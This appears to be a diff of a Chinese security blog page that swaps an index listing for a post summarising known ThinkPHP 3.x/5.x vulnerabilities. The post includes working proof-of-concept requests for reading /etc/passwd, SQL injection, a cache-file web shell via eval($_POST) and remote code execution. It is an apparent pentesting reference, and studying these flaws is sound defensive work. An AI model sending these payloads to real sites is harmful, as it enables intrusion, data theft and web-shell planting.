@@ -22,7 +22,7 @@
     <meta name="description" content="多一份网络防护技能,多一份信息安全保证">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>himawari&#39;Blog</title>
+    <title>THINKPHP漏洞总结 · himawari&#39;Blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -203,12 +203,23 @@
 </head>
 
     
+        <body class="post-body">
+    
     
 <header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >himawari&#39;Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">THINKPHP漏洞总结</a>
+            </div>
+    </div>
     
     <a class="home-link" href=/>himawari'Blog</a>
 </header>
@@ -220,24 +231,74 @@
 
 
 
+
+height:50vh;
 ">
     
     <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/beijing.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
+            
+            THINKPHP漏洞总结
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
+            
+            <!-- 404 -->
+            
         </p>
         <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "框架">框架</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">707</span>阅读时长: <span class="post-count reading-time">3 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/11/22</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
         
     </div>
 </div>
@@ -338,320 +399,160 @@
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main index-page">
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/08/31/爬虫开发基础/" >
-            
-                <span>爬虫开发基础</span>
-        </a>
-        <div class="abstract-content">
-            <h1 id="HTTP与HTTPS的区别"><a href="#HTTP与HTTPS的区别" class="headerlink" title="HTTP与HTTPS的区别"></a>HTTP与HTTPS的区别</h1><p>​        <strong>HTTP超文本传输协议</strong>，是一个客户端和服务器端请求和应答的标准（TCP）。客户端是终端用户，服务器是网站。通过使用WEB浏览器、网络爬虫或者其他工具，客户端发起一个到服务器指定端口的HTTP请求，这个客户叫用户代理（User Agent）.响应的服务器上存储着资源，比如HTML文件和图像，这个服务器为源服务器（Origin Serverr）,在用户代理和服务器中间可能存在多个中间层，比如代理、网关或者隧道（Tunnels）.</p>
-<p>​        通常，由HTTP客户端发起一个请求，建立一个服务器指定端口的TCP连接，HTTP服务器则在那个端口监听客户端发送过来的请求，一旦收到请求，服务器（向客户端）发回一个状态行（比如“HTTP/1.1 200 OK”）和（响应的）消息，消息的消息体可能是请求的文件、错误消息或者其他一些消息。</p>
-<p>​        HTTP协议传输的数据都是未加密的，也就是明文传输，因此使用HTTP协议传输隐私消息非常不安全。为了保证这些隐私数据能够加密传输，于是有了SSL协议用于对HTTP协议传输的数据进行加密，就有了HTTPS。</p>
-<p>​        HTTPS可以理解为HTTP+SSL/TLS在传输数据之前需要看客户端（浏览器）与服务端（网站）之间进行一次握手，在握手过程中将确立双方加密传输数据的密码信息。HTTP与HTTPS的主要区别。</p>
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/08/31</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "Python">Python</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/08/28/网络五/" >
-            
-                <span>网络五</span>
-        </a>
-        <div class="abstract-content">
-            <p><strong>1.路由协议</strong>：静态路由协议和动态路由协议。<br>  （1）<strong>静态路由的基本格式</strong>：ip   route  目标网段  目标子网  下一跳</p>
-<p>  （2）<strong>默认路由</strong>：一般配置在出口路由器（边缘路由器：一边连接的LAN，一边连接WAN），所有不知道的数据包都交给“互联网中的下一跳”。<br>       ip   route   0.0.0.0   0.0.0.0   下一跳 </p>
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/08/28</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "网络基础">网络基础</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/08/25/渗透简介/" >
-            
-                <span>渗透简介</span>
-        </a>
-        <div class="abstract-content">
-            <h5 id="1-1-攻击思路"><a href="#1-1-攻击思路" class="headerlink" title="1.1 攻击思路"></a>1.1 攻击思路</h5><p>有2种思路：</p>
-<pre><code>攻击外网服务器，获取外网服务器的权限，接着利用入侵成功的外网服务器作为跳板，攻击内网其他服务器，最后获得敏感数据，并将数据传递到攻击者，看情况安装长期后门，实现长期控制和获得敏感数据的方式；
+            <main class="main post-page">
+    <article class="article-entry">
+        <p>首先确定这个网站使用<a href="https://www.webshell.cc/tag/thinkphp" target="_blank" rel="noopener">thinkphp</a>的<a href="https://www.webshell.cc/tag/框架" target="_blank" rel="noopener">框架</a></p>
+<p>国内很多php开源项目的代码都是使用<a href="https://www.webshell.cc/tag/thinkphp" target="_blank" rel="noopener">thinkphp</a><a href="https://www.webshell.cc/tag/框架" target="_blank" rel="noopener">框架</a>编写的，但是thinkphp框架有很多版本，如何才能知道我们使用的框架是哪个版本的呢？</p>
+<p>在URL后面加thinkphp的目录，也有可能爆出来[</p>
+<p>这是一个的网站目录。供参考</p>
+<ul>
+<li><strong>admin</strong>是后台工程文件夹</li>
+<li><strong>home</strong>是前台工程</li>
+<li><strong>public</strong>里面用于存放CSS文件，JS文件以及网页里面的图片</li>
+<li><strong>ThinkPHP</strong>框架</li>
+<li><strong>ueditor</strong>是百度编辑器</li>
+</ul>
+<p><strong>ThinkPHP的Ubb标签漏洞读取任意内容</strong> </p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://webshell.cc/index/?path=</span>[<span class="string">code</span>]/etc/passwd[/code]</span><br></pre></td></tr></table></figure>
 
-攻击办公网的系统、办公网电脑、办公网无线等方式，一般是采用社工，实现控制办公电脑，再用获得的办公网数据，可能是内网的各种登录账号和密码，再获取办公网或者生产网的有用数据。</code></pre><p>一般内网安全检查使用第一种思路，实际的攻击2种思路结合实现。</p>
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/08/25</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "渗透测试">渗透测试</a>
-    
-</div>
-            
-        </div>
+<h4 id="Thinkphp-3-0-爆路径漏洞"><a href="#Thinkphp-3-0-爆路径漏洞" class="headerlink" title="Thinkphp 3.0 爆路径漏洞"></a><strong>Thinkphp 3.0 爆路径漏洞</strong></h4><p>thinkphp3.0 模块加载失败，出错信息爆应用程序路径。</p>
+<p>检测有两种情况</p>
+<ol>
+<li>可执行命令</li>
+</ol>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://webshell.<span class="keyword">cc</span>/index.php/<span class="keyword">module</span>/action/param<span class="number">1</span>/$<span class="symbol">%7</span>B<span class="title">@print</span>(THINK_VERSION)<span class="symbol">%7</span>D</span><br></pre></td></tr></table></figure>
+
+<p>可查看版本</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://webshell.<span class="keyword">cc</span>/index.php/<span class="keyword">module</span>/action/param<span class="number">1</span>/$<span class="symbol">%7</span>B<span class="title">@print</span>(phpinfo())<span class="symbol">%7</span>D</span><br></pre></td></tr></table></figure>
+
+<p>可查看phpinfo信息</p>
+<ol start="2">
+<li>不可执行命令，爆路径</li>
+</ol>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://webshell.<span class="keyword">cc</span>/appscn/index.php/<span class="keyword">module</span>/action/param<span class="number">1</span>/$<span class="symbol">%7</span>B<span class="title">@print</span>(phpinfo())<span class="symbol">%7</span></span><br><span class="line">http://webshell.<span class="keyword">cc</span>/index.php/<span class="keyword">module</span>/action/param<span class="number">1</span>/$<span class="symbol">%7</span>B<span class="title">@print</span>(THINK_VERSION)<span class="symbol">%7</span></span><br><span class="line">http://webshell.<span class="keyword">cc</span>/index.php/<span class="keyword">module</span>/action/<span class="keyword">module</span>/param<span class="number">1</span>/$<span class="symbol">%7</span>B<span class="title">@print</span>(THINK_VERSION)<span class="symbol">%7</span>D</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h4 id="ThinkPHP3-2-3-缓存函数设计缺陷可导致Getshell（-2017-08-09-）"><a href="#ThinkPHP3-2-3-缓存函数设计缺陷可导致Getshell（-2017-08-09-）" class="headerlink" title="ThinkPHP3.2.3_缓存函数设计缺陷可导致Getshell（ 2017-08-09 ）"></a>ThinkPHP3.2.3_缓存函数设计缺陷可导致Getshell（ 2017-08-09 ）</h4><p> &lt;= 3.2.3 </p>
+<p> <a href="https://xz.aliyun.com/t/99" target="_blank" rel="noopener">https://xz.aliyun.com/t/99</a> </p>
+<hr>
+<h4 id="ThinkPHP3-2-3-最新版update注入漏洞（-2018-04-16-）"><a href="#ThinkPHP3-2-3-最新版update注入漏洞（-2018-04-16-）" class="headerlink" title="ThinkPHP3.2.3_最新版update注入漏洞（ 2018-04-16 ）"></a>ThinkPHP3.2.3_最新版update注入漏洞（ 2018-04-16 ）</h4><p> &lt;= 3.2.3 </p>
+<p> <a href="https://www.anquanke.com/post/id/104847" target="_blank" rel="noopener">https://www.anquanke.com/post/id/104847</a> </p>
+<hr>
+<h4 id="ThinkPHP3-2-X-find-select-delete注入（-2018-08-23-）"><a href="#ThinkPHP3-2-X-find-select-delete注入（-2018-08-23-）" class="headerlink" title="ThinkPHP3.2.X_find_select_delete注入（ 2018-08-23 ）"></a>ThinkPHP3.2.X_find_select_delete注入（ 2018-08-23 ）</h4><p> &lt;= 3.2.3 </p>
+<p> <a href="https://xz.aliyun.com/t/2631&gt;" target="_blank" rel="noopener">https://xz.aliyun.com/t/2631&gt;</a> &lt;<a href="https://xz.aliyun.com/t/2629" target="_blank" rel="noopener">https://xz.aliyun.com/t/2629</a> </p>
+<hr>
+<h4 id="ThinkPHP3-X-order-by注入漏洞（-2018-08-29-）"><a href="#ThinkPHP3-X-order-by注入漏洞（-2018-08-29-）" class="headerlink" title="ThinkPHP3.X_order_by注入漏洞（ 2018-08-29 ）"></a>ThinkPHP3.X_order_by注入漏洞（ 2018-08-29 ）</h4><p> &lt;= 3.2.3 </p>
+<p> <a href="https://mp.weixin.qq.com/s?__biz=MzIwNTcxNTczMQ==&mid=2247483907&idx=1&sn=3c1f9874878c92d10cff30c1c263fa8a&scene=21#wechat_redirect" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/jDvOif0OByWkUNLv0CAs7w</a> </p>
+<hr>
+<h4 id="ThinkPHP5-SQL注入漏洞-amp-amp-敏感信息泄露（-2017-07-03-）"><a href="#ThinkPHP5-SQL注入漏洞-amp-amp-敏感信息泄露（-2017-07-03-）" class="headerlink" title="ThinkPHP5_SQL注入漏洞&amp;&amp;敏感信息泄露（ 2017-07-03 ）"></a>ThinkPHP5_SQL注入漏洞&amp;&amp;敏感信息泄露（ 2017-07-03 ）</h4><p> &lt; 5.0.9 </p>
+<p> <a href="https://xz.aliyun.com/t/125" target="_blank" rel="noopener">https://xz.aliyun.com/t/125</a> </p>
+<p>POC</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">testsql?ids[<span class="number">0</span>,updatexml(<span class="number">0</span>,concat(<span class="number">0xa</span>,user()),<span class="number">0</span>)]=<span class="number">1231</span></span><br></pre></td></tr></table></figure>
+
+<p> <img src="http://www.secwk.com/wp-content/uploads/2019/09/3-1569601586.jpg" alt="Thinkphp3.x/5.x系列漏洞总结学习"> </p>
+<hr>
+<h4 id="ThinkPHP5-0-10-3-2-3-缓存函数设计缺陷可导致Getshell（-2017-08-09-）"><a href="#ThinkPHP5-0-10-3-2-3-缓存函数设计缺陷可导致Getshell（-2017-08-09-）" class="headerlink" title="ThinkPHP5.0.10-3.2.3_缓存函数设计缺陷可导致Getshell（ 2017-08-09 ）"></a>ThinkPHP5.0.10-3.2.3_缓存函数设计缺陷可导致Getshell（ 2017-08-09 ）</h4><p> &lt; 5.0.11 </p>
+<p> <a href="https://xz.aliyun.com/t/99" target="_blank" rel="noopener">https://xz.aliyun.com/t/99</a> </p>
+<p>POC</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">post data:</span><br><span class="line">   username=%<span class="number">2</span>F%<span class="number">2</span>F%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">24</span>a%<span class="number">3</span>Deval(%<span class="number">24</span>_POST%<span class="number">5</span>B%<span class="number">27</span>a%<span class="number">27</span>%<span class="number">5</span>D)%<span class="number">3</span>B%<span class="number">23</span></span><br><span class="line">注：%<span class="number">2</span>F%<span class="number">2</span>F%<span class="number">0</span>D%<span class="number">0</span>A = <span class="comment">//+回车</span></span><br></pre></td></tr></table></figure>
+
+<p> <img src="http://www.secwk.com/wp-content/uploads/2019/09/3-1569601587.png" alt="Thinkphp3.x/5.x系列漏洞总结学习"> </p>
+<p> <img src="http://www.secwk.com/wp-content/uploads/2019/09/7-1569601587.png" alt="img"> </p>
+<p> <img src="http://www.secwk.com/wp-content/uploads/2019/09/10-1569601588.png" alt="img"> </p>
+<p>其中文件路径和名称是 b0+68931cc450442b63f5b3d276ea4297 而</p>
+<p>md5(‘name’) = b068931cc450442b63f5b3d276ea4297</p>
+<hr>
+<h4 id="ThinkPHP框架5-0-X-sql注入漏洞分析（-2018-04-09-）"><a href="#ThinkPHP框架5-0-X-sql注入漏洞分析（-2018-04-09-）" class="headerlink" title="ThinkPHP框架5.0.X_sql注入漏洞分析（ 2018-04-09 ）"></a>ThinkPHP框架5.0.X_sql注入漏洞分析（ 2018-04-09 ）</h4><p> &lt; 5.0.16 </p>
+<p> <a href="https://xz.aliyun.com/t/2257" target="_blank" rel="noopener">https://xz.aliyun.com/t/2257</a> </p>
+<p>POC</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">testsql?username[<span class="number">0</span>]=inc&amp;username[<span class="number">1</span>]=updatexml(<span class="number">1</span>,concat(<span class="number">0x7</span>,user(),<span class="number">0x7e</span>),<span class="number">1</span>)&amp;username[<span class="number">2</span>]=<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p> <img src="http://www.secwk.com/wp-content/uploads/2019/09/0-1569601589.jpg" alt="Thinkphp3.x/5.x系列漏洞总结学习"> </p>
+<hr>
+<h4 id="ThinkPHP5-X-order-by注入漏洞（-2018-08-23-）"><a href="#ThinkPHP5-X-order-by注入漏洞（-2018-08-23-）" class="headerlink" title="ThinkPHP5.X_order_by注入漏洞（ 2018-08-23 ）"></a>ThinkPHP5.X_order_by注入漏洞（ 2018-08-23 ）</h4><p> &lt;= 5.1.22 </p>
+<p> <a href="https://mp.weixin.qq.com/s?__biz=MzIwNTcxNTczMQ==&mid=2247483907&idx=1&sn=3c1f9874878c92d10cff30c1c263fa8a&scene=21#wechat_redirect" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/jDvOif0OByWkUNLv0CAs7w</a> </p>
+<p>POC</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">testsql?order[id`|updatexml(<span class="number">1</span>,concat(<span class="number">0x3a</span>,user()),<span class="number">1</span>)%<span class="number">23</span>]=<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p> <img src="http://www.secwk.com/wp-content/uploads/2019/09/10-1569601590.jpg" alt="Thinkphp3.x/5.x系列漏洞总结学习"> </p>
+<hr>
+<h4 id="ThinkPHP5-X-远程代码执行（-2018-12-10-）"><a href="#ThinkPHP5-X-远程代码执行（-2018-12-10-）" class="headerlink" title="ThinkPHP5.X_远程代码执行（ 2018-12-10 ）"></a>ThinkPHP5.X_远程代码执行（ 2018-12-10 ）</h4><p> 5.0.5-5.0.22</p>
+<p> 5.1.0-5.1.30 </p>
+<p> <a href="https://xz.aliyun.com/t/3570" target="_blank" rel="noopener">https://xz.aliyun.com/t/3570</a>     <a href="https://paper.seebug.org/760/" target="_blank" rel="noopener">https://paper.seebug.org/760/</a>     <a href="https://paper.seebug.org/770" target="_blank" rel="noopener">https://paper.seebug.org/770</a> </p>
+<p>POC</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index?s=index/thinkcontainer/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br></pre></td></tr></table></figure>
+
+<p> <img src="http://www.secwk.com/wp-content/uploads/2019/09/2-1569601590.jpg" alt="Thinkphp3.x/5.x系列漏洞总结学习"> </p>
+<hr>
+<p>​         <a href="https://github.com/pochubs/pochubs/" target="_blank" rel="noopener">https://github.com/pochubs/pochubs/</a></p>
+<table>
+<thead>
+<tr>
+<th>ThinkPHP3</th>
+<th>ThinkPHP5</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><a href="https://github.com/pochubs/pochubs/blob/master/ThinkPHP.md#thinkphp323_缓存函数设计缺陷可导致getshell" target="_blank" rel="noopener">ThinkPHP3.2.3_缓存函数设计缺陷可导致Getshell</a></td>
+<td><a href="https://github.com/pochubs/pochubs/blob/master/ThinkPHP.md#thinkphp5_sql注入漏洞敏感信息泄露" target="_blank" rel="noopener">ThinkPHP5_SQL注入漏洞&amp;&amp;敏感信息泄露</a></td>
+</tr>
+<tr>
+<td><a href="https://github.com/pochubs/pochubs/blob/master/ThinkPHP.md#thinkphp323_最新版update注入漏洞" target="_blank" rel="noopener">ThinkPHP3.2.3_最新版update注入漏洞</a></td>
+<td><a href="https://github.com/pochubs/pochubs/blob/master/ThinkPHP.md#thinkphp5010-323_缓存函数设计缺陷可导致getshell" target="_blank" rel="noopener">ThinkPHP5.0.10缓存函数设计缺陷可导致Getshell </a></td>
+</tr>
+<tr>
+<td><a href="https://github.com/pochubs/pochubs/blob/master/ThinkPHP.md#thinkphp32x_find_select_delete注入" target="_blank" rel="noopener">ThinkPHP3.2.X_find_select_delete注入</a></td>
+<td><a href="https://github.com/pochubs/pochubs/blob/master/ThinkPHP.md#thinkphp框架50x_sql注入漏洞分析" target="_blank" rel="noopener">ThinkPHP框架5.0.X_sql注入漏洞分析</a></td>
+</tr>
+<tr>
+<td><a href="https://github.com/pochubs/pochubs/blob/master/ThinkPHP.md#thinkphp3x_order_by注入漏洞" target="_blank" rel="noopener">ThinkPHP3.X_order_by注入漏洞</a></td>
+<td><a href="https://github.com/pochubs/pochubs/blob/master/ThinkPHP.md#thinkphp5x_order_by注入漏洞" target="_blank" rel="noopener">ThinkPHP5.X_order_by注入漏洞</a></td>
+</tr>
+<tr>
+<td></td>
+<td><a href="https://github.com/pochubs/pochubs/blob/master/ThinkPHP.md#thinkphp5x_远程代码执行" target="_blank" rel="noopener">ThinkPHP5.X_远程代码执行</a></td>
+</tr>
+</tbody></table>
+
     </article>
+    <!-- license  -->
     
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/08/24/Off-Path-TCP-Exploit/" >
-            
-                <span>Off-Path TCP Exploit</span>
-        </a>
-        <div class="abstract-content">
-            <p>​      We discover a subtle yet serious timing side channel that exists in all generations of IEEE 802.11 or Wi-Fi technology, due to the fact that they are half-duplex. By exploiting the vulnerability, we are able to constrcut reliable and practical off-path TCP injection attacks against the laterst versions of all three major operating systems (macOS, Windows, and Linux). Our attac only requires a devicce connected to the Internet via a wireless router, and be reachable from an attack server. The thread model is that a user is lured to visit a malicious website first and then the puppet (i.e., a malicious javascript) running in a browser collaborates with an off-path adversary to hijack a TCP connection between the client and server for the prupose of injecting a spurious HTTP response that will be cached in the browser. Later on, when the victim accesses to the server, the browser would load the cached object (e.g., a script) rather than request it again. Notice that the victim connection is established and preserved by the puppet who repeatedly includes HTML elements (e.g, images). See <a href="https://people.eecs.berkeley.edu/~yahel/papers/Browser-Cache-Poisoning.Song.Spring10.attack-project.pdf" target="_blank" rel="noopener">web-cache poisoning atttacks</a> for more background.</p>
-<p><strong>我们发现了一个微妙但严重的定时侧通道，存在于所有代的IEEE 802.11或Wi-Fi技术中，因为它们是半双工的。通过利用该漏洞，我们能够针对所有三个主要操作系统（MacOS、Windows和Linux）的最新版本构建可靠且实用的非路径TCP注入攻击。我们的ATTAC只需要一个通过无线路由器连接到互联网的设备，并且可以从攻击服务器访问。线程模型是先引诱用户访问恶意网站，然后在浏览器中运行的Puppet（即恶意javascript）与非路径对手协作，劫持客户端和服务器之间的TCP连接，以防止注入虚假的HTTP响应。将在浏览器中缓存。稍后，当受害者访问服务器时，浏览器将加载缓存对象（例如脚本），而不是再次请求它。注意，受害者连接是由木偶建立和保留的，木偶反复包含HTML元素（例如，图像）。更多背景信息，请参见[网络缓存中毒属性]</strong></p>
+        <div class="license-wrapper">
+            <p>原文作者：<a href="blog.shenzihao.top">申子昊</a>
+            <p>原文链接：<a href="blog.shenzihao.top/2019/11/22/THINKPHP漏洞总结/">blog.shenzihao.top/2019/11/22/THINKPHP漏洞总结/</a>
+            <p>发表日期：<a href="blog.shenzihao.top/2019/11/22/THINKPHP漏洞总结/">November 22nd 2019, 1:01:42 pm</a>
+            <p>更新日期：<a href="blog.shenzihao.top/2019/11/22/THINKPHP漏洞总结/">November 22nd 2019, 3:34:50 pm</a>
+            <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/08/24</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "漏洞复现">漏洞复现</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/08/24/网络四/" >
-            
-                <span>网络四</span>
-        </a>
-        <div class="abstract-content">
-            <p><strong>1.网络层：把数据帧转换为数据包，实现基于IP地址的寻址和转发。</strong><br>  网络层的设备：路由器<br>  网关的作用：当PC想跨网段通信的时候，所有不知道的数据包，都交给网关来处理。</p>
-<p><strong>2.路由器的作用：</strong><br>    （1）实现不同网段的通信；<br>    （2）隔离广播域；<br>          路由器的每个接口=一个网段=一个广播域<br>    （3）为数据包寻找一条最优路径。</p>
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/08/24</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "网络基础">网络基础</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/08/24/网络三/" >
-            
-                <span>网络三</span>
-        </a>
-        <div class="abstract-content">
-            <p><strong>1.网络层：把数据帧转换为数据包，实现基于Ip地址的寻址和转发。</strong><br>  <strong>数据帧：在数据外边加入二层头部（帧头和帧尾）</strong><br>          <strong>Dmac（6Byte）+Smac（6Byte）+Type（2Byte）+Data +FCS（4Byte，帧尾）</strong><br>  <strong>数据包：三层IP头部+数据</strong></p>
-<p><strong>2.IP头部：标准长度是20Byte。</strong><br>  <strong>TTL：time to  live 生存时间，是一个三层防环机制，可以限制一个数据包在网络中传输的时间。</strong><br>       <strong>数据包每经过一个三层设备（路由器），他的TTL值就会减1，如果TTL=0，那么这个数据包就不能继续传输，会被丢弃。</strong><br>       <strong>每经过一个三层设备，叫做1跳。</strong><br>  Protocol：用来标识上层协议，如果是UDP=17；TCP=6；ICMP=1.<br>  Source IP<br>  Destination IP </p>
-<p><strong>3.ARP：Address Resolution  Protocol地址解析协议，用来根据Ip地址解析mac。</strong><br>  <strong>ARP报文分为2类：ARP请求报文Request；ARP响应报文Reply。</strong><br>  ARP请求报文是以广播的形式发送；ARP响应报文是以单播的形式回复。<br>  <strong>arp  -a    //查看arp缓存信息</strong><br>  <strong>arp  -d    //清除ARP缓存</strong></p>
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/08/24</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "网络基础">网络基础</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/08/24/网络二/" >
-            
-                <span>网络二</span>
-        </a>
-        <div class="abstract-content">
-            <p><strong>重点：交换机的工作原理、交换机的简单配置</strong></p>
-<p><strong>1.OSI七层模型：</strong><br>  <strong>（1）物理层</strong>：定义了终端设备的传输介质，传输的是bit流。<br>  <strong>（2）数据链路层</strong>：把bit转换为数据帧，实现基于mac地址的寻址和转发<br>  <strong>（3）网络层</strong>：把数据帧转换为数据包，实现基于IP地址的寻址和转发<br>  <strong>（4）传输层</strong>：把数据包转换为数据段，为数据提供可靠或者不可靠的传输，为应用程序提供端到端的服务<br>  <strong>（5）会话层</strong>：建立、维持和管理、终止会话<br>  <strong>（6）表示层</strong>：数据的表现形式，比如压缩、加密、<br>  <strong>（7）应用层</strong>：为用户提供服务。</p>
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/08/24</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "网络基础">网络基础</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/08/24/网络一/" >
-            
-                <span>网络一</span>
-        </a>
-        <div class="abstract-content">
-            <p><strong>ISP</strong>:运营商，电信、移动、联通<br><strong>IEEE</strong>：国际电子电气工程师协会，致力于电气、电子、计算机工程和与科学有关的领域的开发和研究，在太空<br><strong>ISO</strong>（国际标准化组织）<br><strong>网络设备</strong>：交换（实现相同网段通信）和路由器（找路，实现不同网段通信）<br><strong>IP</strong>：标识网络中任意一台主机的位置（收发件人的地址）</p>
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/08/24</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "网络基础">网络基础</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/08/20/双杀Oday复现/" >
-            
-                <span>CVE20188174-双杀0day漏洞复现</span>
-        </a>
-        <div class="abstract-content">
